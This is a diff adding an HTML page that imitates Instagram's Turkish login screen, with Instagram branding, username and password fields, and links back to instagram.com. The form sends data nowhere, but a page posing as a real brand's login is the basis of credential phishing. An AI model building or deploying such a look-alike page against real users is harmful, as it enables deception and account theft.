@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <link rel="icon" type="image/png" href="/img/instagram.png">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+    .igfont {
+      position: absolute;
+      margin-top: 100px;   /* yukarıdan uzaklık */
+      width: 175px; /* boyut (isteğe bağlı) */
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    .usernameinput{
+        margin-left: 810px;
+        margin-top: 175px;
+        width: 300px;
+        height: 30px;
+        left: 10%;
+        transform: translateX(-90%);
+    }
+
+    .passwordinput{
+        margin-left: 810px;
+        width: 300px;
+        height: 30px;
+        left: 10%;
+        transform: translateX(-90%);
+    }
+
+    .submitinput{
+        margin-left: 815px;
+        width: 300px;
+        height: 35px;
+        color: white;
+        background-color: rgb(0, 158, 158);
+        border: none;
+        border-radius: 8px;
+        left: 8%;
+        transform: translateX(-92%);
+    }
+
+    .yada{
+        font-family: Arial, Helvetica, sans-serif;
+        margin-left: 670px;
+        color: rgb(128, 128, 128);
+    }
+
+    .facebooktext{
+        margin-left: 600px;
+        text-decoration: none;
+        font-family: Arial, Helvetica, sans-serif;
+        color: rgb(0, 82, 158);
+    }
+
+    .forgotpass{
+        margin-left: 620px;
+        text-decoration: none;
+        font-family: Arial, Helvetica, sans-serif;
+        color: rgb(0, 40, 78);
+    }
+
+    .kaydol{
+        font-family: Arial, Helvetica, sans-serif;
+        margin-left: 600px;
+    }
+
+    .kaydollink{
+        font-family: Arial, Helvetica, sans-serif;
+        text-decoration: none;
+    }
+    </style>
+</head>
+<body>
+    <img src="/img/instagramfont.png" class="igfont" alt="Görsel">
+
+    <form>
+        <input class="usernameinput" type="text" name="kullanici" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+        <br>
+        <br>
+        <input class="passwordinput" type="password" name="sifre" placeholder="Şifre" required>
+        <br>
+        <br>
+        <input class="submitinput" type="submit" value="Giriş Yap">
+    </form>
+
+    <br>
+    <br>
+    <span class="yada">YA DA</span>
+    <br>
+    <br>
+    <a href="https://www.instagram.com" class="facebooktext">
+        <img src="/img/facebook.jpg" alt="Görsel">
+        <span>Facebook ile Giriş Yap</span>
+    </a>
+    <br>
+    <br>
+    <a href="https://www.instagram.com" class="forgotpass">
+        <span>Şifreni mi unuttun?</span>
+    </a>
+    <br>
+    <br>
+    <span class="kaydol">Hesabın yok mu?</span>
+    <a href="https://www.instagram.com" class="kaydollink"><span>Kaydol</span></a>
+</body>
+</html
